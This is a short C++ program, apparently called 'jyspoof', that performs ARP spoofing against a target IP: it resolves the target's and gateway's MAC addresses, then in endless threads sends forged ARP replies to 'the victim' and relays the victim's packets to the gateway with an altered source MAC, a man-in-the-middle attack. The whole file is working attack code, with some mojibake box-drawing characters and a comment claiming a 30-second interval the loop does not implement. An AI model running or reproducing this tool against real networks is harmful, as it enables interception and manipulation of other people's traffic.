#include <IOStream>
#include <Thread>
#include <tangu\tangu_spoof.hpp>

#pragma comment(lib, "tangu.lib")

INT main(INT argc, LPSTR argv[])
{
	using std::cout;
	using std::cerr;
	using namespace Net;
	using namespace Packet;
	using std::thread;

	if (argc != 2)
	{
		cerr << "<Usage> : jyspoof {IP to spoof}\n";
		return EXIT_FAILURE;
	}

	PCAP_DEVICE PcapDev(&IsMyDeviceWithDescription);
	IPInfo TargetIP{ string{ argv[1] } };
	ARPSpoof Spoofer(&PcapDev.Interface, TargetIP);

	if (Spoofer.IsARPValid())
	{
		cout << "\nTarget resources have been found out!\n";
		cout << "忙式式式式式式式式式式式式式式式式式式式式忖\n";
		cout << "弛  [  Target  MAC ] : " + Spoofer.ARPFrame._Rsrc.MDst() + "  弛\n";
		cout << "弛  [  Gateway MAC ] : " + Spoofer.Gateway.first() + "  弛\n";
		cout << "戌式式式式式式式式式式式式式式式式式式式式戎\n";
	}
	else
	{
		cout << L"Failed to search target or gateway resources. (TIMED OUT)\n";
		return EXIT_FAILURE;
	}

	cout << "Start ARP Reply...\n";
	cout << "Start Target (" + Spoofer.ARPFrame._Rsrc.MDst() + ")'s Packet Relay...  ";

	thread Reply([&]()
	{
		//
		// Reply fake ARP to the victim per 30s.
		//
		while (true)
		{

			Spoofer.Reply();
		}
	});
	thread Relay([&]()
	{
		//
		// Monitor packets that the victim sends to an attacker. (faked gateway) */
		// Those will be relayed to gateway with altered source MAC 
		//
		Spoofer.Relay();
	});

	while (true) { ; }
}